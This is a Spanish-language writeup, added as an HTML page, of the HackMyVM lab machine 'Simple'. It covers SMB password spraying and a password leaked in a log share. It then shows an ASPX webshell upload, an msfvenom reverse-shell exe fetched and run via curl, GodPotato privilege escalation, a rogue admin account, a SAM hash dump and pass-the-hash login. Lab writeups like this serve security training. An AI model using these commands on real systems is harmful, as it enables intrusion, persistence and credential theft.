@@ -1,0 +1,447 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width initial-scale=1" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="robots" content="noindex">
+
+  <title>Writeup HackMyVM Simple</title>
+
+  <meta name="description" content="Resolución de la máquina Simple de la plataforma de HackMyVM">
+  <meta name="author" content="xchg2pwn">
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Writeup HackMyVM Simple">
+  <meta name="twitter:description" content="Resolución de la máquina Simple de la plataforma de HackMyVM">
+  <meta name="twitter:creator" content="xchg2pwn">  
+  <meta name="twitter:image" content="/images/otros/hackmyvm.png" />
+
+  <meta property="og:site_name" content="xchg2pwn" />
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="Writeup HackMyVM Simple">
+  <meta property="og:description" content="Resolución de la máquina Simple de la plataforma de HackMyVM">
+  <meta property="og:image" content="/images/otros/hackmyvm.png" />
+
+  <link rel="manifest" href="/images/favicons/manifest.json">
+  <link rel="shortcut icon" type="image/png" sizes="64x64" href="/images/otros/hackmyvm.png">
+
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+  
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+
+  <link rel="stylesheet" href="/css/main.css?1678854914750547280">
+  <link rel="alternate" type="application/rss+xml" title="Writeup HackMyVM Simple" href="/feed.xml">
+</head>
+
+  <body style="background-color: #282828;">
+  
+    <span class="mobile btn-mobile-menu">
+      <i class="icon icon-list btn-mobile-menu__icon"></i>
+      <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
+    </span>
+
+<header class="panel-cover" style="background-image: url(/images/cover.jpg)">
+
+  <div class="panel-main">
+    <div class="panel-main__inner panel-inverted">
+      <div class="panel-main__content">
+
+          <img src="/images/profile.jpg" class="user-image zoomable" alt="xchg2pwn">
+          <h1 class="panel-cover__title panel-title scale-up-center">xchg2pwn</h1>
+
+        <hr class="panel-cover__divider">
+        <p class="panel-cover__description slide-top">Entusiasta del reversing y desarrollo de exploits</p>
+        <hr class="panel-cover__divider panel-cover__divider--secondary">
+
+        <div class="navigation-wrapper">
+         <nav class="cover-navigation cover-navigation--primary">
+            <ul class="navigation">
+              <li class="navigation__item grow"><a href="/hackmyvm" title="xchg2pwn" class="blog-button">HackMyVM</a></li>
+            </ul>
+          </nav>
+
+          <nav class="cover-navigation navigation--social">
+            <ul class="navigation">
+              
+              <li class="navigation__item grow">
+                <a href="https://github.com/xchg2pwn" title="Github" target="_blank">
+                  <i class="icon icon-social-github"></i>
+                  <span class="label">GitHub</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://twitter.com/xchg2pwn" title="Twitter" target="_blank">
+                  <i class="icon icon-social-twitter"></i>
+                  <span class="label">Twitter</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://instagram.com/xchg2pwn" title="Instagram" target="_blank">
+                  <i class="icon icon-social-instagram"></i>
+                  <span class="label">Instagram</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://youtube.com/@xchg2pwn" title="Youtube" target="_blank">
+                  <i class="icon icon-social-youtube"></i>
+                  <span class="label">Youtube</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="mailto:xchg2pwn@gmail.com" title="Correo Electronico" target="_blank">
+                  <i class="icon icon-mail"></i>
+                  <span class="label">Email</span>
+                </a>
+              </li>
+
+            </ul>
+          </nav>
+        </div>
+      </div>
+    </div>
+
+    <div class="panel-cover--overlay"></div>
+  </div>
+</header>
+    <br>
+    <div class="content-wrapper">
+      <div class="content-wrapper__inner">
+        <article class="post-container post-container--single">
+    <div class="izquierda">
+      <h3 class="post-title">Contenido</h3><br>
+      <ul>
+        <li><a href="#enumeration">Enumeración</a></li>
+        <li><a href="#access-bogo">Access - bogo</a></li>
+        <li><a href="#access-marcos">Access - marcos</a></li>
+        <li><a href="#shell-defaultapppool">Shell - defaultapppool</a></li>
+        <li><a href="#shell-Administrator">Shell - Administrator</a></li>
+      </ul>
+  </div>
+
+  <header class="post-header slide-top">
+    <h4 class="post-title">HackMyVM</h4>
+    <picture><img src="/images/otros/hackmyvm.png" style="float: right; margin-right:0px; margin-left:0px; height:60px;" class="include_image zoomable"/></picture>
+    <h2 class="post-title">Simple</h2><br>
+  </header>
+  
+<section class="post" id="enumeration">
+<br><h3 class="post-title">Enumeración</h3><br>
+
+<p class="plain-text">Iniciamos la máquina escaneando los puertos de la máquina con <code class="language-plaintext highlighter-rouge">nmap</code> donde encontramos varios puertos abiertos, la mayoria son puertos tipicos de <code class="language-plaintext highlighter-rouge">windows</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ nmap </span><span class="p">192.168.100.80
+Nmap scan report for 192.168.100.80  
+PORT      STATE SERVICE
+80/tcp    open  http
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+445/tcp   open  microsoft-ds
+5985/tcp  open  wsman
+47001/tcp open  winrm
+49664/tcp open  unknown
+49665/tcp open  unknown
+49666/tcp open  unknown
+49667/tcp open  unknown
+49668/tcp open  unknown
+49669/tcp open  unknown</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Para hacer un reconocimiento basico podemos usar <code class="language-plaintext highlighter-rouge">crackmapexec</code>, al pasarle la ip por SMB detecta el nombre del equipo, este es <code class="language-plaintext highlighter-rouge">local</code> y no pertenece a un dominio</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ crackmapexec </span><span class="p">smb 192.168.100.80
+</span><span class="az">SMB         </span><span class="p">192.168.100.80  445    SIMPLE           </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:SIMPLE) (domain:Simple) (signing:False) (SMBv1:False)  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Algo a tener en cuenta mas adelante es que el servidor esta montado en un <code class="language-plaintext highlighter-rouge">IIS</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ curl</span><span class="p"> -s 192.168.100.80 -I | </span><span class="ve">grep </span><span class="p">Server
+</span><span class="ro">Server</span><span class="p">: Microsoft-IIS/10.0</span>
+</code></pre></div></div><br>
+
+</section>
+
+<section class="post" id="access-bogo">
+<br><h3 class="post-title">Access - bogo</h3><br>
+
+<p class="plain-text">Si vamos a la web nos encontramos una web que aun esta en desarrollo, algo interesante es que en los agradecimientos podemos ver varios posibles <code class="language-plaintext highlighter-rouge">usuarios</code></p>
+<a href="/hackmyvm/simple/1.png" target="_blank"><div><p><img src="/hackmyvm/simple/1.png"></p></div></a>
+
+<p class="plain-text">Ya que no tenemos nada mas podemos probar con <code class="language-plaintext highlighter-rouge">crackmapexec</code> si algun usuario usa su mismo usuario como contraseña, solo el usuario <code class="language-plaintext highlighter-rouge">bogo</code> nos devuelve un <code class="language-plaintext highlighter-rouge">[+]</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ crackmapexec </span><span class="p">smb 192.168.100.80 -u users.txt -p users.txt --no-bruteforce --continue-on-success
+</span><span class="az">SMB         </span><span class="p">192.168.100.80  445    SIMPLE           </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:SIMPLE) (domain:Simple) (signing:False) (SMBv1:False)  
+</span><span class="az">SMB         </span><span class="p">192.168.100.80  445    SIMPLE           </span><span class="ro">[-] </span><span class="p">Simple\ruy:ruy STATUS_LOGON_FAILURE 
+</span><span class="az">SMB         </span><span class="p">192.168.100.80  445    SIMPLE           </span><span class="ro">[-] </span><span class="p">Simple\marcos:marcos STATUS_LOGON_FAILURE 
+</span><span class="az">SMB         </span><span class="p">192.168.100.80  445    SIMPLE           </span><span class="ro">[-] </span><span class="p">Simple\lander:lander STATUS_LOGON_FAILURE 
+</span><span class="az">SMB         </span><span class="p">192.168.100.80  445    SIMPLE           </span><span class="ve">[+] </span><span class="p">Simple\bogo:bogo 
+</span><span class="az">SMB         </span><span class="p">192.168.100.80  445    SIMPLE           </span><span class="ro">[-] </span><span class="p">Simple\vaiper:vaiper STATUS_LOGON_FAILURE</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Comprobamos con crackmapexec y si listamos los recursos <code class="language-plaintext highlighter-rouge">smb</code> compartidos encontramos un recurso <code class="language-plaintext highlighter-rouge">LOGS</code> donde tenemos privilegios <code class="language-plaintext highlighter-rouge">READ</code> o de lectura</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ crackmapexec </span><span class="p">smb 192.168.100.80 -u bogo -p bogo --shares
+</span><span class="az">SMB         </span><span class="p">192.168.100.80  445    SIMPLE           </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:SIMPLE) (domain:Simple) (signing:False) (SMBv1:False)  
+</span><span class="az">SMB         </span><span class="p">192.168.100.80  445    SIMPLE           </span><span class="ve">[+] </span><span class="p">Simple\bogo:bogo 
+</span><span class="az">SMB         </span><span class="p">192.168.100.80  445    SIMPLE           </span><span class="az">[*] </span><span class="p">Enumerated shares
+</span><span class="az">SMB         </span><span class="p">192.168.100.80  445    SIMPLE           </span><span class="am">Share           Permissions     Remark
+</span><span class="az">SMB         </span><span class="p">192.168.100.80  445    SIMPLE           </span><span class="am">-----           -----------     ------
+</span><span class="az">SMB         </span><span class="p">192.168.100.80  445    SIMPLE           </span><span class="am">ADMIN$                          Admin remota
+</span><span class="az">SMB         </span><span class="p">192.168.100.80  445    SIMPLE           </span><span class="am">C$                              Recurso predeterminado
+</span><span class="az">SMB         </span><span class="p">192.168.100.80  445    SIMPLE           </span><span class="am">IPC$            READ            IPC remota
+</span><span class="az">SMB         </span><span class="p">192.168.100.80  445    SIMPLE           </span><span class="am">LOGS            READ            
+</span><span class="az">SMB         </span><span class="p">192.168.100.80  445    SIMPLE           </span><span class="am">WEB</span>
+</code></pre></div></div><br>
+
+</section>
+
+<section class="post" id="access-marcos">
+<br><h3 class="post-title">Access - marcos</h3><br>
+
+<p class="plain-text">Al acceder al recurso compartido encontramos un archivo <code class="language-plaintext highlighter-rouge">.log</code>, en el archivo hay algunos comandos de <code class="language-plaintext highlighter-rouge">powershell</code>, y en uno de ellos se lekea una contraseña</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ impacket-smbclient </span><span class="p">bogo:bogo@192.168.100.80
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+Type help for list of commands
+# use logs
+# ls
+drw-rw-rw-          0  Sun Oct  8 21:23:36 2023 .
+drw-rw-rw-          0  Sun Oct  8 21:23:36 2023 ..
+-rw-rw-rw-       2200  Sun Oct  8 21:23:36 2023 20231008.log  
+# get 20231008.log
+# exit
+
+</span><span class="ve">❯ grep </span><span class="p">-ri password 20231008.log    
+PS C:\> net use \\127.0.0.1\WEB /user:marcos Super</span><span class="ro">Password  </span>
+</code></pre></div></div><br>
+
+
+<p class="plain-text">Comprobamos la contraseña de marcos con <code class="language-plaintext highlighter-rouge">crackmapexec</code> y es valida, si listamos ahora los recursos compartidos tenemos <code class="language-plaintext highlighter-rouge">WRITE</code> o de escritura en <code class="language-plaintext highlighter-rouge">WEB</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ crackmapexec </span><span class="p">smb 192.168.100.80 -u marcos -p SuperPassword
+</span><span class="az">SMB         </span><span class="p">192.168.100.80  445    SIMPLE           </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:SIMPLE) (domain:Simple) (signing:False) (SMBv1:False)  
+</span><span class="az">SMB         </span><span class="p">192.168.100.80  445    SIMPLE           </span><span class="ve">[+] </span><span class="p">Simple\marcos:SuperPassword
+
+</span><span class="ve">❯ crackmapexec </span><span class="p">smb 192.168.100.80 -u marcos -p SuperPassword --shares
+</span><span class="az">SMB         </span><span class="p">192.168.100.80  445    SIMPLE           </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:SIMPLE) (domain:Simple) (signing:False) (SMBv1:False)  
+</span><span class="az">SMB         </span><span class="p">192.168.100.80  445    SIMPLE           </span><span class="ve">[+] </span><span class="p">Simple\marcos:SuperPassword 
+</span><span class="az">SMB         </span><span class="p">192.168.100.80  445    SIMPLE           </span><span class="az">[*] </span><span class="p">Enumerated shares
+</span><span class="az">SMB         </span><span class="p">192.168.100.80  445    SIMPLE           </span><span class="am">Share           Permissions     Remark
+</span><span class="az">SMB         </span><span class="p">192.168.100.80  445    SIMPLE           </span><span class="am">-----           -----------     ------
+</span><span class="az">SMB         </span><span class="p">192.168.100.80  445    SIMPLE           </span><span class="am">ADMIN$                          Admin remota
+</span><span class="az">SMB         </span><span class="p">192.168.100.80  445    SIMPLE           </span><span class="am">C$                              Recurso predeterminado
+</span><span class="az">SMB         </span><span class="p">192.168.100.80  445    SIMPLE           </span><span class="am">IPC$            READ            IPC remota
+</span><span class="az">SMB         </span><span class="p">192.168.100.80  445    SIMPLE           </span><span class="am">LOGS            READ            
+</span><span class="az">SMB         </span><span class="p">192.168.100.80  445    SIMPLE           </span><span class="am">WEB             READ,WRITE</span>
+</code></pre></div></div><br>
+
+</section>
+
+<section class="post" id="shell-defaultapppool">
+<br><h3 class="post-title">Shell - defaultapppool</h3><br>
+
+<p class="plain-text">Si nos conectamos al recurso <code class="language-plaintext highlighter-rouge">smb</code> podemos encontrar todos los archivos de la web</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ impacket-smbclient </span><span class="p">marcos:SuperPassword@192.168.100.80
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+Type help for list of commands
+# use web
+# ls
+drw-rw-rw-          0  Fri Oct 13 15:30:38 2023 .
+drw-rw-rw-          0  Fri Oct 13 15:30:38 2023 ..
+drw-rw-rw-          0  Sun Oct  8 21:22:20 2023 03-comming-soon  
+drw-rw-rw-          0  Sun Oct  8 20:00:33 2023 aspnet_client
+drw-rw-rw-          0  Sun Oct  8 21:18:47 2023 common-js
+drw-rw-rw-          0  Sun Oct  8 21:18:47 2023 fonts
+drw-rw-rw-          0  Sun Oct  8 21:18:47 2023 images
+-rw-rw-rw-       1481  Sun Oct  8 21:26:47 2023 index.html
+#</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ya que sabemos que corre un <code class="language-plaintext highlighter-rouge">IIS</code> podemos intentar subir una <a href="https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.aspx">webshell</a> en aspx</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p"># put cmd.aspx
+# ls cmd.aspx
+-rw-rw-rw-       1547  Fri Oct 13 15:36:49 2023 cmd.aspx  
+#</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Desde la webshell podemos ejecutar <code class="language-plaintext highlighter-rouge">comandos</code> como el usuario <code class="language-plaintext highlighter-rouge">defaultapppool</code></p>
+<a href="/hackmyvm/simple/3.png" target="_blank"><div><p><img src="/hackmyvm/simple/3.png"></p></div></a>
+
+<p class="plain-text">Para conseguir una <code class="language-plaintext highlighter-rouge">shell</code> crearemos un <code class="language-plaintext highlighter-rouge">exe</code> el cual nos enviara una <code class="language-plaintext highlighter-rouge">powershell</code> a nuestro host por el puerto 443 y lo compartimos con un servidor <code class="language-plaintext highlighter-rouge">http</code> de <code class="language-plaintext highlighter-rouge">python</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ msfvenom </span><span class="p">-p windows/x64/powershell_reverse_tcp LHOST=192.168.100.70 LPORT=443 -f exe -o shell.exe  
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 1897 bytes
+Final size of exe file: 8192 bytes
+Saved as: shell.exe
+
+</span><span class="ve">❯ sudo python3 </span><span class="p">-m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ahora simplemente cambiamos el comando por uno que descargue y ejecute el exe</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">curl 192.168.100.70/shell.exe -o C:\ProgramData\shell.exe && C:\ProgramData\shell.exe</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al ejecutarlo nos envia una <code class="language-plaintext highlighter-rouge">powershell</code> como la clasica cuenta de servicio de <code class="language-plaintext highlighter-rouge">IIS</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ sudo netcat </span><span class="p">-lvnp 443
+Listening on 0.0.0.0 443
+Connection received on 192.168.100.80
+Windows PowerShell running as user SIMPLE$ on SIMPLE
+Copyright (C) Microsoft Corporation. All rights reserved.  
+
+PS C:\windows\system32\inetsrv> </span><span class="am">whoami</span><span class="p">
+iis apppool\defaultapppool
+PS C:\windows\system32\inetsrv></span>
+</code></pre></div></div><br>
+
+</section>
+
+<section class="post" id="shell-administrator">
+<br><h3 class="post-title">Shell - Administrator</h3><br>
+
+<p class="plain-text">Como tenemos una shell de una cuenta de servicio es probable que tenga privilegios interesantes, mirando los privilegios podemos encontrar <code class="language-plaintext highlighter-rouge">SeImpersonatePrivilege</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\windows\system32\inetsrv> </span><span class="am">whoami </span><span class="p">/priv
+
+INFORMACIÓN DE PRIVILEGIOS
+--------------------------
+
+Nombre de privilegio          Descripción                                       Estado       
+============================= ================================================= =============  
+SeAssignPrimaryTokenPrivilege Reemplazar un símbolo (token) de nivel de proceso Deshabilitado
+SeIncreaseQuotaPrivilege      Ajustar las cuotas de la memoria para un proceso  Deshabilitado
+SeAuditPrivilege              Generar auditorías de seguridad                   Deshabilitado
+SeChangeNotifyPrivilege       Omitir comprobación de recorrido                  Habilitada   
+SeImpersonatePrivilege        Suplantar a un cliente tras la autenticación      Habilitada   
+SeCreateGlobalPrivilege       Crear objetos globales                            Habilitada   
+SeIncreaseWorkingSetPrivilege Aumentar el espacio de trabajo de un proceso      Deshabilitado
+
+PS C:\windows\system32\inetsrv></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al ser un windows actual sera dificil explotarlo con <a href="https://github.com/antonioCoco/JuicyPotatoNG">JuicyPotato</a>, como alternativa podemos usar <a href="https://github.com/BeichenDream/GodPotato">GodPotato</a> pensado para explotarse en versiones mas actuales</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\ProgramData> </span><span class="am">curl </span><span class="p">192.168.100.70/GodPotato-NET4.exe </span><span class="c1">-o </span><span class="p">GodPotato-NET4.exe
+PS C:\ProgramData> </span><span class="am">.\GodPotato-NET4.exe </span><span class="c1">-cmd </span><span class="az">"cmd /c whoami"</span><span class="p">
+[*] CombaseModule: 0x140716628049920
+[*] DispatchTable: 0x140716630367472
+[*] UseProtseqFunction: 0x140716629742752
+[*] UseProtseqFunctionParamCount: 6
+[*] HookRPC
+[*] Start PipeServer
+[*] CreateNamedPipe \\.\pipe\767414ec-1235-40f4-a222-d04ee94ac13a\pipe\epmapper
+[*] Trigger RPCSS
+[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
+[*] DCOM obj IPID: 00006402-08c0-ffff-b6b8-931cb982c960
+[*] DCOM obj OXID: 0xe44ea31f9a405558
+[*] DCOM obj OID: 0x9b14dac06534a8d
+[*] DCOM obj Flags: 0x281
+[*] DCOM obj PublicRefs: 0x0
+[*] Marshal Object bytes len: 100
+[*] UnMarshal Object
+[*] Pipe Connected!
+[*] CurrentUser: NT AUTHORITY\Servicio de red
+[*] CurrentsImpersonationLevel: Impersonation
+[*] Start Search System Token
+[*] PID : 736 Token:0x844  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation  
+[*] Find System Token : True
+[*] UnmarshalObject: 0x80070776
+[*] CurrentUser: NT AUTHORITY\SYSTEM
+[*] process start with pid 2636
+nt authority\system
+PS C:\ProgramData></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al ejecutarlo podemos ejecutar un comando como <code class="language-plaintext highlighter-rouge">nt authority\system</code> asi que para conseguir una shell podemos ejecutar el <code class="language-plaintext highlighter-rouge">shell.exe</code> que subimos antes</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\ProgramData> </span><span class="am">.\GodPotato-NET4.exe</span><span class="c1"> -cmd </span><span class="az">"cmd /c C:\ProgramData\shell.exe"  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Unos segundos despues recibimos una <code class="language-plaintext highlighter-rouge">powershell</code> como este usuario que tiene maximos privilegios en el equipo, ahora podemos leer ambas <code class="language-plaintext highlighter-rouge">flags</code> de la maquina</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ sudo netcat </span><span class="p">-lvnp 443
+Listening on 0.0.0.0 443
+Connection received on 192.168.100.80 
+Windows PowerShell running as user SIMPLE$ on SIMPLE
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+PS C:\ProgramData> </span><span class="am">whoami</span><span class="p">
+nt authority\system
+PS C:\ProgramData> </span><span class="am">type </span><span class="p">C:\Users\marcos\Desktop\user.txt
+SIMPLE{ASPXT0SH311}
+PS C:\ProgramData> </span><span class="am">type </span><span class="p">C:\Users\Administrador\Desktop\root.txt  
+SIMPLE{S31MP3R50N4T3PR1V1L363}
+PS C:\ProgramData></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Si quisieramos obtener una shell algo mas interactiva podriamos crear un usuario <code class="language-plaintext highlighter-rouge">administrador</code> para despues con dumpear la <code class="language-plaintext highlighter-rouge">sam</code> para ver todos los hashes NT</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\ProgramData> </span><span class="am">net </span><span class="p">user pwned password123# /add  
+Se ha completado el comando correctamente.
+
+PS C:\ProgramData> </span><span class="am">net </span><span class="p">localgroup Administradores pwned /add  
+Se ha completado el comando correctamente.
+
+PS C:\ProgramData></span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ crackmapexec </span><span class="p">smb 192.168.100.80 -u pwned -p password123# --sam
+</span><span class="az">SMB         </span><span class="p">192.168.100.80  445    SIMPLE           </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:SIMPLE) (domain:Simple) (signing:False) (SMBv1:False)  
+</span><span class="az">SMB         </span><span class="p">192.168.100.80  445    SIMPLE           </span><span class="ve">[+] </span><span class="p">Simple\pwned:password123# </span><span class="am">(Pwn3d!)</span><span class="p">
+</span><span class="az">SMB         </span><span class="p">192.168.100.80  445    SIMPLE           </span><span class="az">[*] </span><span class="p">Dumping SAM hashes
+</span><span class="az">SMB         </span><span class="p">192.168.100.80  445    SIMPLE           </span><span class="am">Administrador:500:aad3b435b51404eeaad3b435b51404ee:4a7b21b82decebdc8589948bfcf4da16:::
+</span><span class="az">SMB         </span><span class="p">192.168.100.80  445    SIMPLE           </span><span class="am">Invitado:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+</span><span class="az">SMB         </span><span class="p">192.168.100.80  445    SIMPLE           </span><span class="am">DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+</span><span class="az">SMB         </span><span class="p">192.168.100.80  445    SIMPLE           </span><span class="am">WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+</span><span class="az">SMB         </span><span class="p">192.168.100.80  445    SIMPLE           </span><span class="am">marcos:1003:aad3b435b51404eeaad3b435b51404ee:104a92f7a0c45e38c04d1b283460be2b:::
+</span><span class="az">SMB         </span><span class="p">192.168.100.80  445    SIMPLE           </span><span class="am">bogo:1006:aad3b435b51404eeaad3b435b51404ee:5ec8ca783dec29fc24d55640edc6aa36:::
+</span><span class="az">SMB         </span><span class="p">192.168.100.80  445    SIMPLE           </span><span class="am">pwned:1007:aad3b435b51404eeaad3b435b51404ee:e5abfbc0410c5ce37bae2276dee52aaf:::
+</span><span class="az">SMB         </span><span class="p">192.168.100.80  445    SIMPLE           </span><span class="ve">[+] </span><span class="p">Added </span><span class="am">7 </span><span class="p">SAM hashes to the database</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Finalmente podemos conectarnos con <code class="language-plaintext highlighter-rouge">evil-winrm</code> haciendo un passthehash como el usuario <code class="language-plaintext highlighter-rouge">Administrator</code> y asi obtener una powershell mucho mas interactiva</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ evil-winrm</span><span class="p"> -i 192.168.100.80 -u Administrador -H 4a7b21b82decebdc8589948bfcf4da16  
+PS C:\Users\Administrador\Documents> </span><span class="am">whoami</span><span class="p">
+simple\administrador
+PS C:\Users\Administrador\Documents> </span><span class="am">type</span><span class="p"> ..\Desktop\root.txt
+SIMPLE{S31MP3R50N4T3PR1V1L363}
+PS C:\Users\Administrador\Documents></span>
+</code></pre></div></div><br>
+
+</section>
+
+</article>
+  </div>
+  <footer class="footer">
+    <span class="footer__copyright">&copy; 2024 - xchg2pwn</span>
+  </footer><br><br>
+
+<script type="text/javascript" src="/js/jquery.min.js"></script>
+<script type="text/javascript" src="/js/main.js?1678894953382991917"></script>
+
+    </div>
+  </body>
+</html>
